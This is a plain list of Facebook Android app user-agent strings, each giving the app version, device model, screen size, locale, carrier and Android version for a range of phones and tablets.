"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783051;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/254.0.0.37.125;FBBV/194387493;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Y2;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/217449705;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845518;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/217590984;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/271.0.0.55.109;FBBV/215365690;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/216344615;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=3.0,width=1080,height=2175};FBLC/en_US;FBRV/217753680;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/217790254;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/218008447;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997166;FBDM/{density=2.25,width=720,height=1172};FBLC/es_LA;FBRV/205643271;FBCR/BITEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845488;FBDM/{density=1.5,width=1200,height=1848};FBLC/en_US;FBRV/217831574;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T510;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845465;FBDM/{density=2.0,width=1536,height=2048};FBLC/en_US;FBRV/218114099;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T713;FBSV/7.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845599;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/217716541;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/219186427;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681928;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/213532798;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1650;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/219212572;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540683;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540788;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/186600517;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/219517567;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047962;FBDM/{density=3.5,width=1440,height=2935};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G986U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2342};FBLC/en_US;FBRV/219557400;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-V600;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=4.5,width=1440,height=2711};FBLC/en_US;FBRV/219846921;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/221.0.0.48.102;FBBV/154683426;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/VodaCom-SA;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/266.0.0.56.124;FBBV/209027753;FBDM/{density=2.0,width=720,height=1412};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/220725958;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047955;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/LAVA;FBBD/LAVA;FBPN/com.facebook.katana;FBDV/Z61_2GB;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237403;FBDM/{density=4.5,width=1440,height=2744};FBLC/en_US;FBRV/221225384;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047954;FBDM/{density=1.5,width=480,height=888};FBLC/en_US;FBRV/219557400;FBCR/HOME;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/A501DL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=4.5,width=1440,height=2744};FBLC/en_US;FBRV/221258992;FBCR/Home;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2138};FBLC/en_US;FBRV/213981597;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G850;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/221258992;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/221654980;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237482;FBDM/{density=3.5,width=1440,height=2984};FBLC/en_US;FBRV/221258992;FBCR/Verizon;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 4 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/221727328;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/262.0.0.34.117;FBBV/203997198;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/204707002;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/222706988;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/224352632;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U1;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/259.0.0.36.115;FBBV/200359504;FBDM/{density=1.3312501,width=1280,height=736};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB3-850M;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/225303678;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372624;FBDM/{density=2.25,width=720,height=1359};FBLC/en_US;FBRV/225615770;FBCR/T-Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372569;FBDM/{density=2.0,width=720,height=1402};FBLC/en_US;FBRV/225615770;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A102U;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/225844509;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.625,width=1080,height=2181};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237439;FBDM/{density=1.7,width=720,height=1469};FBLC/hi_IN;FBRV/0;FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1911;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/225421328;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372471;FBDM/{density=1.0,width=1280,height=752};FBLC/en_GB;FBRV/225933467;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X104F;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129392;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/226498918;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129304;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/226498918;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=3.0,width=1080,height=1792};FBLC/en_US;FBRV/226498918;FBCR/TNT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L29;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/226498918;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129309;FBDM/{density=4.0,width=1440,height=2560};FBLC/uk_UA;FBRV/226498918;FBCR/KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/227103212;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129304;FBDM/{density=3.0,width=1080,height=1794};FBLC/it_IT;FBRV/227302326;FBCR/vodafone IT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VIE-L09;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/226498918;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129304;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/227665120;FBCR/Airtel-Stay Home | airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129392;FBDM/{density=3.5,width=1440,height=2759};FBLC/en_US;FBRV/227554369;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129297;FBDM/{density=1.5,width=480,height=888};FBLC/en_US;FBRV/0;FBCR/HOME;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/A501DL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129392;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/227475226;FBCR/AT&amp-T MicroCell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129301;FBDM/{density=2.0,width=720,height=1196};FBLC/en_US;FBRV/227809097;FBCR/AT&amp-T;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X210APM;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.0,width=1080,height=2168};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/226498918;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=4.5,width=1440,height=2744};FBLC/en_US;FBRV/227989218;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.75,width=1080,height=2030};FBLC/uk_UA;FBRV/227809097;FBCR/Vodafone UA;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 10; POT-LX3 Build/HUAWEIPOT-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=3.0,width=1080,height=2139};FBLC/es_LA;FBRV/0;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX3;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/226498918;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z3;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_GB;FBRV/0;FBCR/BT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129301;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/228426117;FBCR/TESCO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=2.625,width=1080,height=2047};FBLC/en_US;FBRV/214205475;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237435;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/222058974;FBCR/;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/Coolpad 3632A;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/0;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.0,width=1080,height=2029};FBLC/en_US;FBRV/228512590;FBCR/HOME;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129304;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/227278404;FBCR/U.S. Cellular;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z3 Play;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/267.1.0.46.120;FBBV/210653461;FBDM/{density=1.75,width=720,height=1423};FBLC/en_US;FBRV/0;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372498;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1803;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128646;FBDM/{density=3.0,width=1080,height=2016};FBLC/zh_TW;FBRV/0;FBCR/Chunghwa;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1719;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128731;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/229111691;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) play;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/228608424;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/229211157;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128622;FBDM/{density=1.5,width=540,height=960};FBLC/ru_RU;FBRV/229378049;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G532F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281745;FBDM/{density=2.0,width=720,height=1280};FBLC/it_IT;FBRV/0;FBCR/I TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J710F;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/228601831;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128636;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/229211157;FBCR/HOME;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S337TL;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129347;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e6;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=2.8125,width=1080,height=2029};FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281745;FBDM/{density=2.0,width=720,height=1199};FBLC/en_US;FBRV/0;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGL84VL;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845518;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/218008447;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
